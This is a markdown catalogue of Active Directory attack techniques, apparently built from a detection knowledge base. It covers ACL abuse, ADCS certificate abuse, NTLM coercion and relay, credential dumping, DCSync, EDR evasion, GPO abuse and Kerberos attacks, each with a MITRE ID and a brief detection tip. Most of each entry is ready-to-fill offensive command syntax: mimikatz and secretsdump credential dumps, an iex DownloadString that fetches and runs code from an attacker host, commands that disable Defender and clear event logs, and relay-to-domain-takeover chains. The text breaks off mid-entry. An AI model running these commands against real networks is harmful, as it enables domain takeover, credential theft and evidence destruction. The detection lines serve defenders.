# AdStrike Skills — 93 Techniques from SAST Knowledge Base

## ACL ABUSE (7 techniques)

### 🔴 [CRITICAL] DCSync Rights Granted to Unprivileged Account via dacledit
**MITRE:** T1484.001  |  **ID:** `acl-dcsync-grant-001`
> Detects modification of domain object DACL to grant DS-Replication permissions to a non-privileged account. Enables DCSync attacks from any machine with that account's credentials.

**Commands:**
```
impacket-dacledit -action write -rights DCSync -principal {user} -target-dn '{base_dn}' {dom}/{user}:{pass}
```
**Detection:** Audit and alert on Event ID 5136 for domain object ACL changes

### 🔴 [CRITICAL] Unauthorized Group Membership Addition — GenericAll/GenericWrite Abuse
**MITRE:** T1098  |  **ID:** `acl-group-addmember-001`
> Detects adding unauthorized users to privileged groups using GenericAll or GenericWrite ACE over the target group. Enables privilege escalation by adding attacker account to Domain Admins, Enterprise 

**Commands:**
```
net rpc group addmem '{grp}' '{user}' -U {dom}\\{user}%{pass} -S {dc}
```
```
Add-DomainGroupMember -Identity 'Domain Admins' -Members {user}
```
**Detection:** Alert on Event IDs 4728/4732/4756 for sensitive groups immediately

### 🟠 [HIGH] Force Password Change — ExtendedRight Abuse
**MITRE:** T1098  |  **ID:** `acl-forcechangepassword-001`
> Detects forced password changes using ExtendedRight "User-Force-Change-Password" ACE. Attacker changes target account password without knowing current password, enabling account takeover.

**Commands:**
```
impacket-changepasswd {dom}/{victim}@{dc} -newpass '{newpass}' -altuser {user} -altpass '{pass}'
```
```
Set-DomainUserPassword -Identity {victim} -AccountPassword (ConvertTo-SecureString '{pass}' -AsPlainText -Force)
```
```
net rpc password {victim} '{newpass}' -U {dom}\\{user}%{pass} -S {dc}
```
**Detection:** Audit User-Force-Change-Password ACE on all user objects

### 🔴 [CRITICAL] Shadow Credentials — msDS-KeyCredentialLink Attribute Injection
**MITRE:** T1556.006  |  **ID:** `acl-shadow-credentials-001`
> Detects injection of attacker-controlled key into msDS-KeyCredentialLink attribute (Windows Hello for Business). Enables Kerberos pre-auth using certificate without knowing account password. Works via

**Commands:**
```
certipy shadow auto -u {user}@{dom} -p {pass} -account '{target}' -dc-ip {dc}
```
```
pywhfb -target {target} -dc-ip {dc} -u {user} -p {pass}
```
```
Whisker.exe add /target:{target}
```
**Detection:** Alert on any msDS-KeyCredentialLink modification (Event 5136)

### 🟠 [HIGH] Computer Account Creation via MachineAccountQuota
**MITRE:** T1098.001  |  **ID:** `acl-add-computer-001`
> Detects creation of computer accounts by non-privileged users exploiting the default MachineAccountQuota=10. Used as prerequisite for RBCD attacks and other computer-account-dependent escalations.

**Commands:**
```
impacket-addcomputer -computer-name '{comp}$' -computer-pass '{pass}' {dom}/{user}:{pass} -dc-ip {dc}
```
```
New-MachineAccount -MachineAccount {comp} -Password (ConvertTo-SecureString '{pass}' -AsPlainText -Force)
```
**Detection:** Set MachineAccountQuota to 0 (prevents non-admin computer account creation)

### 🟠 [HIGH] Unauthorized LAPS Password Read via LDAP
**MITRE:** T1552.006  |  **ID:** `acl-laps-read-001`
> Detects unauthorized reading of ms-Mcs-AdmPwd (LAPS password) attribute from Active Directory. Provides local admin credentials for LAPS-managed computers.

**Commands:**
```
nxc ldap {dc} -u {user} -p {pass} -d {dom} -M laps
```
```
ldapsearch -b '{base_dn}' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd cn
```
```
Get-LAPSPasswords -DomainController {dc} -Credential {creds}
```
**Detection:** Enable LAPS attribute access auditing

### 🟠 [HIGH] BloodHound LDAP Collection — ACL Enumeration for Attack Path Discovery
**MITRE:** T1087.002  |  **ID:** `acl-bloodhound-001`
> Detects BloodHound data collection which queries all AD objects, ACLs, group memberships, and computer sessions via LDAP. Creates large number of LDAP queries in short time.

**Commands:**
```
bloodhound-python -u {user} -p {pass} -d {dom} -dc {dc} -c All --zip
```
```
SharpHound.exe -c All --zipfilename bh.zip
```
**Detection:** Monitor for bulk LDAP queries from non-DC hosts

## CERT ABUSE (8 techniques)

### 🔴 [CRITICAL] ESC1 — Certificate Enrollment with Arbitrary SAN (Domain Admin Impersonation)
**MITRE:** T1649  |  **ID:** `cert-esc1-001`
> ESC1: Certificate template allows requestor to specify Subject Alternative Name (SAN) with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT. Attacker enrolls certificate as Domain Admin by specifying admin UPN in SA

**Commands:**
```
certipy req -u '{user}@{dom}' -p '{pass}' -dc-ip {dc} -template '{template}' -upn 'administrator@{dom}' -ca '{ca}'
```
```
certipy auth -pfx admin.pfx -dc-ip {dc} -domain {dom}
```
**Detection:** Remove CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT from template flags

### 🔴 [CRITICAL] ESC4 — Certificate Template ACL Overwrite (WriteDACL/WriteOwner/GenericWrite)
**MITRE:** T1649  |  **ID:** `cert-esc4-001`
> ESC4: Attacker has WriteDACL, WriteOwner, or GenericWrite over a certificate template. Modifies template to grant ENROLLEE_SUPPLIES_SUBJECT, then requests certificate as DA. Certipy template command w

**Commands:**
```
certipy template -u '{user}@{dom}' -p '{pass}' -dc-ip {dc} -template '{template}' -save-old
```
**Detection:** Audit and alert on Event 5136 for pKICertificateTemplate object modifications

### 🔴 [CRITICAL] ESC6 — CA Flag Abuse (EDITF_ATTRIBUTESUBJECTALTNAME2)
**MITRE:** T1649  |  **ID:** `cert-esc6-001`
> ESC6: CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set, allowing SAN in any request even if template doesn't have ENROLLEE_SUPPLIES_SUBJECT. Equivalent impact to ESC1 but at CA level.

**Commands:**
```
certipy ca -u '{user}@{dom}' -p '{pass}' -dc-ip {dc} -enable-template 'SubCA'
```
```
certipy req -u '{user}@{dom}' -p '{pass}' -dc-ip {dc} -template SubCA -upn 'administrator@{dom}' -ca '{ca}'
```
**Detection:** Remove EDITF_ATTRIBUTESUBJECTALTNAME2 flag from CA

### 🔴 [CRITICAL] ESC8 — NTLM Relay to ADCS Web Enrollment for DC Certificate
**MITRE:** T1557  |  **ID:** `cert-esc8-001`
> ESC8: ADCS web enrollment endpoint (certsrv) accepts NTLM authentication. Attacker relays DC NTLM authentication (via PrinterBug/PetitPotam) to ADCS, obtains DC certificate, then uses PKINIT to get DC

**Commands:**
```
impacket-ntlmrelayx -t http://{dc}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```
```
certipy relay -ca {dc} -template DomainController
```
**Detection:** Enable HTTPS on ADCS web enrollment (disable HTTP)

### 🟠 [HIGH] ESC9 — No Security Extension (SID Binding Bypass)
**MITRE:** T1649  |  **ID:** `cert-esc9-001`
> ESC9: Template has CT_FLAG_NO_SECURITY_EXTENSION (0x80000) in msPKI-Enrollment-Flag. Issued cert lacks szOID_NTDS_CA_SECURITY_EXT SID binding, allowing cert to be used for auth as different account if
**Detection:** Require CA to mark certificates with szOID_NTDS_CA_SECURITY_EXT

### 🟠 [HIGH] ESC11 — RPC Relay to Certificate Enrollment (IF_ENFORCEENCRYPTICERTREQUEST)
**MITRE:** T1557  |  **ID:** `cert-esc11-001`
> ESC11: CA does not have IF_ENFORCEENCRYPTICERTREQUEST flag, enabling NTLM relay to RPC-based certificate enrollment (MS-ICPR) without encryption. Attacker relays SMB/HTTP auth to obtain arbitrary cert
**Detection:** Set IF_ENFORCEENCRYPTICERTREQUEST flag on CA

### 🟠 [HIGH] PKINIT Authentication — Certificate Used for Kerberos TGT
**MITRE:** T1558  |  **ID:** `cert-pkinit-001`
> Detects use of certificate for Kerberos pre-authentication (PKINIT). Used post-ESC1/ESC6/Shadow Credentials to get TGT. UnPAC-the-Hash extracts NTLM hash from the TGT without touching LSASS.

**Commands:**
```
certipy auth -pfx '{pfx}' -dc-ip {dc} -domain {dom}
```
```
certipy auth -pfx '{pfx}' -dc-ip {dc} -domain {dom} -no-hash  # UnPAC-the-Hash
```
```
Rubeus.exe asktgt /user:{user} /certificate:{base64_pfx} /ptt
```
**Detection:** Monitor Event 4768 with certificate fields populated

### 🟡 [MEDIUM] ADCS Template Enumeration — Certipy find
**MITRE:** T1087.002  |  **ID:** `cert-enum-001`
> Detects ADCS template enumeration via certipy find or Certify.exe. Generates LDAP queries against PKI container for template attributes.

**Commands:**
```
certipy find -u '{user}@{dom}' -p '{pass}' -dc-ip {dc} -vulnerable -stdout
```
```
Certify.exe find /vulnerable
```
**Detection:** Monitor bulk pKICertificateTemplate LDAP reads

## COERCION ATTACKS (9 techniques)

### 🔴 [CRITICAL] MS-RPRN PrinterBug — Force DC Authentication via Print Spooler
**MITRE:** T1187  |  **ID:** `coerce-printerbug-001`
> MS-RPRN's RpcRemoteFindFirstPrinterChangeNotification API forces target to authenticate to attacker-controlled host. Used to capture NTLMv2 hash or relay to LDAP/ADCS. Requires Print Spooler running o

**Commands:**
```
python3 printerbug.py '{dom}/{user}:{pass}@{dc}' {attacker}
```
```
.\\MS-RPRN.exe \\\\{dc} \\\\{attacker}
```
```
crackmapexec smb {dc} -u {user} -p {pass} -M spooler  # Check if vulnerable
```
**Detection:** Disable Print Spooler service on all Domain Controllers (not needed)

### 🔴 [CRITICAL] PetitPotam — EfsRpc Forced Authentication (Authenticated and Unauthenticated)
**MITRE:** T1187  |  **ID:** `coerce-petitpotam-001`
> PetitPotam exploits MS-EFSRPC (EfsRpcOpenFileRaw) to force target to authenticate to attacker. Can work unauthenticated on older Windows versions. Used for NTLM relay to LDAP or ADCS to compromise dom

**Commands:**
```
python3 PetitPotam.py -u '{user}' -p '{pass}' -d '{dom}' {attacker} {dc}
```
```
python3 PetitPotam.py {attacker} {dc}  # Unauthenticated (older systems)
```
**Detection:** Apply MS KB5005413 (PetitPotam patches)

### 🟠 [HIGH] DFSCoerce — NetrDfsAddStdRoot MS-DFSNM Forced Authentication
**MITRE:** T1187  |  **ID:** `coerce-dfscoerce-001`
> DFSCoerce exploits MS-DFSNM NetrDfsAddStdRoot/NetrDfsRemoveStdRoot to force authentication. Authenticated vector. Works even when PetitPotam is patched.

**Commands:**
```
python3 dfscoerce.py -u '{user}' -p '{pass}' -d '{dom}' {attacker} {dc}
```
**Detection:** Disable DFS-N service on DCs if not required

### 🔴 [CRITICAL] Coercer Framework — Automated Multi-Protocol Coercion Scan and Exploit
**MITRE:** T1187  |  **ID:** `coerce-coercer-001`
> Coercer automatically tries all known coercion methods (MS-RPRN, MS-EFSRPC, MS-DFSNM, MS-FSRVP, MS-TSCH, etc.) against target. -scan mode passive detection, no authentication attempt. High-value targe

**Commands:**
```
coercer scan -u '{user}' -p '{pass}' -d '{dom}' -t {dc}  # Passive check
```
```
coercer coerce -u '{user}' -p '{pass}' -d '{dom}' -l {attacker} -t {dc}
```
**Detection:** Block all coercible RPC interfaces at network perimeter

### 🟠 [HIGH] Responder — LLMNR/NBT-NS Poisoning for NTLMv2 Hash Capture
**MITRE:** T1557.001  |  **ID:** `coerce-responder-001`
> Responder poisons LLMNR and NBT-NS name resolution to redirect victims to attacker's SMB/HTTP server for NTLMv2 hash capture. Combined with coercion for targeted hash collection.

**Commands:**
```
sudo responder -I eth0 -rdw  # Start poisoner
```
```
Combined with coercion to capture DC$ NTLMv2 hash
```
**Detection:** Disable LLMNR via Group Policy: Computer Configuration → Administrative Templates → Network → DNS Client → Turn off multicast name resolution

### 🔴 [CRITICAL] NTLM Relay to LDAP — Computer Account / DCSync Rights
**MITRE:** T1557  |  **ID:** `coerce-ntlm-relay-ldap-001`
> NTLM relay to LDAP/LDAPS allows attacker to authenticate as victim (typically DC$) and perform LDAP operations: add computer accounts, grant DCSync rights, set RBCD, or modify group membership. impack

**Commands:**
```
impacket-ntlmrelayx -t ldap://{dc} -smb2support --add-computer {comp} {comp_pass}
```
```
impacket-ntlmrelayx -t ldaps://{dc} -smb2support --escalate-user {user}
```
```
impacket-ntlmrelayx -t ldap://{dc} -smb2support --delegate-access  # RBCD
```
**Detection:** Enable LDAP signing (require signing for LDAP clients)

### 🔴 [CRITICAL] NTLM Relay to ADCS — DC Certificate Enrollment for DA Takeover
**MITRE:** T1649  |  **ID:** `coerce-ntlm-relay-adcs-001`
> Most impactful relay attack: coerce DC$ authentication, relay to ADCS web enrollment, obtain DC certificate, use PKINIT to get DC TGT, then DCSync all hashes. Full domain compromise in minutes. Attack

**Commands:**
```
impacket-ntlmrelayx -t http://{dc}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```
```
certipy relay -ca {dc} -template DomainController
```
```
certipy auth -pfx dc.pfx -dc-ip {dc} -domain {dom}  # Get DC TGT
```
```
impacket-secretsdump {dom}/dc$@{dc} -k -no-pass  # DCSync
```
**Detection:** Enable HTTPS + EPA on ADCS Web Enrollment (prevents relay)

### 🔴 [CRITICAL] NTLM Relay with Shadow Credentials — msDS-KeyCredentialLink via Relay
**MITRE:** T1556.006  |  **ID:** `coerce-shadow-cred-relay-001`
> ntlmrelayx --shadow-credentials injects attacker certificate into msDS-KeyCredentialLink of target account (usually DC$) during relay. Enables PKINIT authentication as DC$ → DCSync.

**Commands:**
```
impacket-ntlmrelayx -t ldap://{dc} --shadow-credentials --shadow-target {target}$
```
**Detection:** Enable LDAP signing + channel binding

### 🔴 [CRITICAL] Unconstrained Delegation TGT Capture via Coercion
**MITRE:** T1134.001  |  **ID:** `coerce-unconstrained-tgt-001`
> Rubeus monitor on unconstrained delegation host captures forwarded TGT when coercion forces DC to authenticate. Captured TGT used for Pass-the-Ticket → DCSync or domain compromise.

**Commands:**
```
Rubeus.exe monitor /interval:5 /filteruser:DC$  # On unconstrained host
```
```
Rubeus.exe ptt /ticket:{base64}  # After capture
```
```
Rubeus.exe s4u /ticket:{base64} /impersonateuser:Administrator /msdsspn:cifs/{dc} /ptt
```
**Detection:** Remove Unconstrained Delegation from non-DC computers

## CREDENTIAL DUMP (8 techniques)

### 🔴 [CRITICAL] LSASS Memory Access — Credential Extraction
**MITRE:** T1003.001  |  **ID:** `credump-lsass-001`
> Detects attempts to read LSASS process memory for credential extraction. Covers Mimikatz, lsassy, nanodump, PPLdump, and SafetyKatz techniques.

**Commands:**
```
mimikatz sekurlsa::logonpasswords
```
```
mimikatz sekurlsa::ekeys
```
```
C:\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```
```
Invoke-Mimi -Command '\"sekurlsa::logonpasswords\"'
```
```
rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump {lsass_pid} C:\\lsass.dmp full
```
**Detection:** Enable RunAsPPL (Protected Process Light) for LSASS

### 🔴 [CRITICAL] Invoke-Mimi PowerShell In-Memory Credential Dump
**MITRE:** T1003.001  |  **ID:** `credump-lsass-invoke-mimi-001`
> Detects Invoke-Mimi (PowerShell in-memory Mimikatz) execution for credential dumping. No binary written to disk — loaded via DownloadString.

**Commands:**
```
iex ((New-Object Net.WebClient).DownloadString('http://{attacker}/Invoke-Mimi.ps1'))
```
```
Invoke-Mimi -Command '\"sekurlsa::logonpasswords\"'
```
```
Invoke-Mimi -Command '\"sekurlsa::ekeys\"'
```
```
Invoke-Mimi -Command '\"lsadump::dcsync /user:{dom}\\krbtgt\"'
```
**Detection:** Enable PowerShell Script Block Logging (GPO)

### 🟠 [HIGH] SAM Registry Hive Access — Local Account Hash Extraction
**MITRE:** T1003.002  |  **ID:** `credump-sam-001`
> Detects access to SAM registry hive for local account credential extraction. impacket-secretsdump uses remote registry service; reg save copies hive.

**Commands:**
```
impacket-secretsdump {dom}/{user}:{pass}@{dc} -sam -system -outputfile /tmp/sam_dump
```
```
reg save HKLM\\SAM C:\\sam.save
```
```
reg save HKLM\\SYSTEM C:\\system.save
```
```
impacket-secretsdump -sam C:\\sam.save -system C:\\system.save LOCAL
```
**Detection:** Restrict remote registry access via Group Policy

### 🔴 [CRITICAL] DCSync — Replication-Based NTDS Hash Extraction
**MITRE:** T1003.003  |  **ID:** `credump-ntds-dcsync-001`
> DCSync mimics DC replication to extract password hashes without touching NTDS.dit file. Requires DS-Replication-Get-Changes-All privilege. Used by impacket-secretsdump and mimikatz lsadump::dcsync.

**Commands:**
```
impacket-secretsdump {dom}/{user}:{pass}@{dc} -just-dc-ntlm -outputfile /tmp/ntds_hashes
```
```
mimikatz lsadump::dcsync /user:{dom}\\krbtgt
```
```
mimikatz lsadump::dcsync /all /csv
```
```
Invoke-Mimi -Command '\"lsadump::dcsync /user:{dom}\\krbtgt\"'
```
**Detection:** Audit DS-Replication-Get-Changes ACE on domain object

### 🟠 [HIGH] LSA Secrets Extraction via Remote Registry
**MITRE:** T1003.004  |  **ID:** `credump-lsa-secrets-001`
> LSA Secrets store service account credentials, DPAPI master keys, and cached domain credentials. Accessible via SECURITY hive or remote secretsdump with SYSTEM privileges.

**Commands:**
```
impacket-secretsdump {dom}/{user}:{pass}@{dc} -just-dc-user SYSTEM
```
```
impacket-secretsdump {dom}/{user}:{pass}@{dc} -outputfile /tmp/full_dump
```
**Detection:** Enable LSA Protection (PPL for LSA process)

### 🟠 [HIGH] LAPS Password — ms-Mcs-AdmPwd Attribute Read
**MITRE:** T1552.006  |  **ID:** `credump-laps-001`
> Detects unauthorized reading of LAPS (Local Administrator Password Solution) attribute ms-Mcs-AdmPwd from Active Directory. Reading this attribute provides local admin credentials for managed computer

**Commands:**
```
nxc ldap {dc} -u {user} -p {pass} -d {dom} -M laps
```
```
nxc smb {dc} -u {user} -p {pass} -d {dom} -M laps
```
```
ldapsearch -b '{base_dn}' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd cn
```
**Detection:** Enable LAPS audit logging

### 🔴 [CRITICAL] AES Encryption Key Extraction — sekurlsa::ekeys
**MITRE:** T1003.001  |  **ID:** `credump-ekeys-001`
> Extraction of AES128/AES256 Kerberos encryption keys from LSASS. Keys enable Overpass-the-Hash (Pass-the-Key), Silver Ticket, and S4U2Self attacks without needing plaintext passwords.

**Commands:**
```
mimikatz sekurlsa::ekeys
```
```
Invoke-Mimi -Command '\"sekurlsa::ekeys\"'
```
```
C:\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```
**Detection:** Enable Credential Guard (makes AES keys unavailable in user-mode LSASS)

### 🟠 [HIGH] Windows Credential Vault Dump — vault::cred /patch
**MITRE:** T1555.004  |  **ID:** `credump-vault-001`
> Dumps credentials stored in Windows Credential Manager via Mimikatz token::elevate + vault::cred /patch. Can extract credentials stored by scheduled tasks, services, and users via cmdkey.

**Commands:**
```
mimikatz token::elevate vault::cred /patch
```
```
Invoke-Mimi -Command '\"token::elevate\" \"vault::cred /patch\"'
```
```
$vault = New-Object Windows.Security.Credentials.PasswordVault; $vault.RetrieveAll()
```
**Detection:** Audit stored credentials (cmdkey /list)

## DCSYNC DCSHADOW (4 techniques)

### 🔴 [CRITICAL] DCSync — Full Domain Hash Dump via Replication Protocol
**MITRE:** T1003.003  |  **ID:** `dcsync-all-hashes-001`
> DCSync uses MS-DRSR (Directory Replication Service Remote Protocol) to request password data as if replicating from a DC. Requires DS-Replication-Get-Changes-All privilege. Extracts NTLM hashes for al

**Commands:**
```
impacket-secretsdump {dom}/{user}:{pass}@{dc} -just-dc-ntlm -outputfile /tmp/dcsync_all
```
```
mimikatz lsadump::dcsync /all /csv
```
```
Invoke-Mimi -Command '\"lsadump::dcsync /user:{dom}\\krbtgt\"'
```
**Detection:** Audit DS-Replication-Get-Changes ACE on domain object

### 🔴 [CRITICAL] DCSync — Targeted Account Replication (krbtgt / Administrator)
**MITRE:** T1003.003  |  **ID:** `dcsync-targeted-001`
> Targeted DCSync requesting specific accounts (krbtgt, Administrator). More stealthy than full dump — fewer 4662 events generated.

**Commands:**
```
impacket-secretsdump {dom}/{user}:{pass}@{dc} -just-dc-user {target}
```
```
mimikatz lsadump::dcsync /user:{dom}\\krbtgt
```
**Detection:** Same as DCSync-all-001

### 🔴 [CRITICAL] DCShadow — Rogue Domain Controller Registration for Stealth AD Modification
**MITRE:** T1207  |  **ID:** `dcsync-dcshadow-001`
> DCShadow temporarily registers attacker machine as a Domain Controller using Mimikatz. Allows pushing arbitrary AD changes (group membership, SID history, password hash) that appear as legitimate DC r
**Detection:** Monitor CN=Configuration for new nTDSDSA objects (rogue DC registration)

### 🟡 [MEDIUM] DCSync Rights Enumeration — dacledit Read on Domain Object
**MITRE:** T1087.002  |  **ID:** `dcsync-rights-check-001`
> Attacker enumerates which accounts have DS-Replication rights on domain object to identify existing DCSync-capable accounts or verify own rights.

**Commands:**
```
impacket-dacledit -action read -target-dn '{base_dn}' {dom}/{user}:{pass} -dc-ip {dc} | grep -iE 'replication|dcsync|DS-Replication'
```
```
Get-DomainObjectAcl -Identity '{base_dn}' -ResolveGUIDs | Where-Object { $_.ObjectAceType -match 'DS-Replication'}
```
**Detection:** Enumerate current replication rights regularly

## EDR EVASION (8 techniques)

### 🔴 [CRITICAL] Windows Defender Disabled via Set-MpPreference
**MITRE:** T1562.001  |  **ID:** `edr-defender-disable-001`
> Set-MpPreference used to disable Windows Defender real-time protection, IOAV protection, behavior monitoring, and cloud protection. Standard CRTP flow — first step before loading offensive tools.

**Commands:**
```
Set-MpPreference -DisableRealtimeMonitoring $true
```
```
Set-MpPreference -DisableIOAVProtection $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true
```
```
Add-MpPreference -ExclusionPath {tools_path}
```
**Detection:** Alert on Windows Defender Event 5001 (protection disabled) — critical

### 🔴 [CRITICAL] SafetyKatz via Loader.exe — In-Memory Credential Dump (No Disk Write)
**MITRE:** T1003.001  |  **ID:** `edr-safetykatz-001`
> SafetyKatz is modified Mimikatz that bypasses AV signatures. Loader.exe fetches it from HTTP (127.0.0.1:8080 via port forwarding) and loads directly into memory. No file written to disk — bypasses fil

**Commands:**
```
C:\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe \"sekurlsa::logonpasswords\" \"exit\
```
```
C:\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe \"sekurlsa::ekeys\" \"exit\
```
**Detection:** Monitor Loader.exe execution and HTTP connections from process

### 🟠 [HIGH] AMSI Bypass — AmsiScanBuffer Patch in PowerShell Session
**MITRE:** T1059.001  |  **ID:** `edr-amsi-bypass-001`
> AMSI (Antimalware Scan Interface) bypass patches AmsiScanBuffer function in amsi.dll to return AMSI_RESULT_CLEAN for all scans. Multiple variants: reflection, direct patching, COM object manipulation.
**Detection:** Enable AMSI for all PowerShell versions (v5+)

### 🟠 [HIGH] ETW Patching — Event Tracing for Windows Telemetry Disabled
**MITRE:** T1562.006  |  **ID:** `edr-etw-patch-001`
> ETW (Event Tracing for Windows) patching blinds EDR products that rely on ETW for telemetry. Patches EtwEventWrite in ntdll.dll to return immediately without writing events. Effective against CrowdStr

**Commands:**
```
[Reflection.Assembly]::LoadFile('C:\\Windows\\System32\\ntdll.dll')
```
**Detection:** Deploy EDR with kernel-mode telemetry (not reliant on ETW)

### 🟠 [HIGH] NTDLL Unhooking — Bypass EDR Userland Hooks
**MITRE:** T1055  |  **ID:** `edr-ntdll-unhook-001`
> EDR products hook ntdll.dll syscall stubs to inspect API calls. NTDLL unhooking loads clean copy from disk and replaces hooked section. Hell's Gate uses direct syscalls to bypass hooks entirely.

**Commands:**
```
HellsGate.exe / SysWhispers / Freshcopy technique
```
**Detection:** Deploy kernel-mode EDR (EarlyBird injection detection)

### 🔴 [CRITICAL] nanodump — Stealth LSASS Dump Bypassing Defender/CrowdStrike
**MITRE:** T1003.001  |  **ID:** `edr-nanodump-001`
> nanodump uses invalid file signatures and process ID spoofing to dump LSASS while bypassing EDR. Creates a minidump without the MDMP signature that can be post-processed offline.

**Commands:**
```
nanodump.exe --pid {lsass_pid} --write C:\\lsass.dmp
```
```
nanodump.exe --valid"  # Valid minidump with fake signature
```
**Detection:** Enable RunAsPPL for LSASS

### 🔴 [CRITICAL] Windows Event Log Clearing — Anti-Forensics
**MITRE:** T1562.002  |  **ID:** `edr-clear-logs-001`
> Clearing Windows event logs removes evidence of attacker activity. wevtutil.exe cl is the most common method. System event 1102 generated upon Security log clearing (requires auditing enabled).

**Commands:**
```
wevtutil.exe cl Security
```
```
wevtutil.exe cl System
```
```
Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }
```
```
Clear-WinEvent -LogName Security
```
**Detection:** Forward event logs to central SIEM immediately (before clearing)

### 🔴 [CRITICAL] RunAsPPL Disabled — LSASS PPL Protection Removed
**MITRE:** T1562.001  |  **ID:** `edr-runasppl-disable-001`
> RunAsPPL (Protected Process Light) prevents LSASS memory access. PPLKiller or registry modification disables this protection. After disable, full LSASS dump is possible.
**Detection:** Enable PPL Tamper Protection (requires Secure Boot)

## GPO ABUSE (6 techniques)

### 🔴 [CRITICAL] Unauthorized GPO Creation and OU Linking
**MITRE:** T1484.001  |  **ID:** `gpo-create-link-001`
> Attacker with GPO creation rights creates malicious GPO and links it to target OU. All computers/users in that OU execute GPO settings at next Group Policy refresh (90 minutes or forced via gpupdate).

**Commands:**
```
New-GPO -Name '{gpo_name}' | New-GPLink -Target '{target_ou}'
```
```
SharpGPOAbuse.exe --AddComputerTask --TaskName {name} --Author {user} --Command cmd.exe --Arguments '/c {cmd}' --GPOName '{gpo}'
```
**Detection:** Alert on Event 5137 for new GPO creation by non-admin accounts

### 🔴 [CRITICAL] GPO Registry RunKey — Code Execution on Startup via Group Policy
**MITRE:** T1547.001  |  **ID:** `gpo-runkey-001`
> Attacker abuses GPO to push registry RunKey to all computers in target OU. Executes payload on every system restart or group policy refresh. HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run via

**Commands:**
```
Set-GPPrefRegistryValue -Name '{gpo_name}' -Context Computer -Action Create -Key 'HKLM\\...\\Run' -ValueName '{name}' -Value '{cmd}'
```
**Detection:** Monitor SYSVOL for new Registry.xml files in Policy folders

### 🔴 [CRITICAL] GPO Immediate Scheduled Task — SharpGPOAbuse
**MITRE:** T1053.005  |  **ID:** `gpo-scheduled-task-001`
> SharpGPOAbuse creates an "Immediate" scheduled task via GPO that executes on next Group Policy refresh without waiting for reboot. Most immediate GPO code execution technique.

**Commands:**
```
SharpGPOAbuse.exe --AddComputerTask --TaskName {name} --Author {user} --Command cmd.exe --Arguments '/c {cmd}' --GPOName '{gpo}' --Force
```
**Detection:** Monitor SYSVOL ScheduledTasks directories for new XML files

### 🔴 [CRITICAL] GPO Restricted Groups — Unauthorized Local Admin Addition
**MITRE:** T1098.001  |  **ID:** `gpo-restricted-groups-001`
> GPO Restricted Groups policy forces group membership on managed computers. Adding attacker account to Local Administrators via GPO grants local admin on all computers in linked OUs automatically.

**Commands:**
```
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {user} --GPOName '{gpo}'
```
**Detection:** Monitor GptTmpl.inf files in SYSVOL for Group Membership section changes

### 🔴 [CRITICAL] GPP CPassword — Encrypted Credentials in SYSVOL Group Policy Files
**MITRE:** T1552.006  |  **ID:** `gpo-gpp-passwords-001`
> Group Policy Preferences (GPP) stored credentials in SYSVOL encrypted with static AES256 key published by Microsoft (MS14-025). Credentials from Groups.xml, Scheduledtasks.xml, Services.xml, DataSourc

**Commands:**
```
crackmapexec smb {dc} -u {user} -p {pass} -d {dom} -M gpp_password
```
```
crackmapexec smb {dc} -u {user} -p {pass} -d {dom} -M gpp_autologin
```
```
Get-GPPPassword
```
```
findstr /s /i cpassword \\\\{dc}\\sysvol
```
**Detection:** Apply MS14-025 patch (removes ability to create new GPP passwords)

### 🟡 [MEDIUM] GPO Delegation — Enumerate Write Permissions on Group Policy Objects
**MITRE:** T1087.002  |  **ID:** `gpo-delegation-enum-001`
> Bloodhound and PowerView enumerate GPO write permissions to find accounts with GPO modification rights. Any account with write access to a GPO linked to privileged OUs can compromise all computers in 

**Commands:**
```
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs
```
```
bloodhound-python -c GPOs
```
**Detection:** Audit GPO write permissions via Group Policy Management Console

## KERBEROS ATTACKS (8 techniques)

### 🟠 [HIGH] AS-REP Roasting — Kerberos Pre-Auth Disabled Request
**MITRE:** T1558.004  |  **ID:** `kerberos-asrep-roast-001`
> Detects AS-REP requests for accounts with Kerberos pre-authentication disabled. Attacker enumerates user list and collects crackable hashes offline via GetNPUsers (impacket) or Rubeus.

**Commands:**
```
impacket-GetNPUsers {domain}/ -dc-ip {dc} -usersfile users.txt -format hashcat
```
```
Rubeus.exe asreproast /nowrap
```
**Detection:** Enable Kerberos pre-authentication for ALL accounts

### 🟠 [HIGH] Kerberoasting — TGS Request for Service Accounts with SPN
**MITRE:** T1558.003  |  **ID:** `kerberos-kerberoast-001`
> Detects bulk TGS requests for service accounts with SPNs. Attacker uses authenticated account to request service tickets and cracks them offline. High number of TGS requests from single host is anomal

**Commands:**
```
impacket-GetUserSPNs {domain}/{user}:{pass} -request -outputfile hashes.txt
```
```
Rubeus.exe kerberoast /nowrap
```
```
Invoke-Kerberoast -OutputFormat HashCat
```
**Detection:** Use gMSA (Group Managed Service Accounts) — auto-rotating 240-char passwords

### 🔴 [CRITICAL] Pass-the-Ticket — Kerberos Ticket Injection via klist/Rubeus
**MITRE:** T1550.003  |  **ID:** `kerberos-ptt-001`
> Detects Kerberos ticket injection into a logon session from outside the normal Kerberos authentication flow. Golden/Silver tickets and stolen .ccache files are injected to gain unauthorized access.

**Commands:**
```
export KRB5CCNAME=/tmp/admin.ccache; impacket-psexec domain/admin@dc -k -no-pass
```
```
Rubeus.exe ptt /ticket:<base64>
```
```
mimikatz kerberos::ptt ticket.kirbi
```
**Detection:** Enable Protected Users security group for privileged accounts

### 🔴 [CRITICAL] Golden Ticket — Forged TGT Using krbtgt Hash
**MITRE:** T1558.001  |  **ID:** `kerberos-golden-ticket-001`
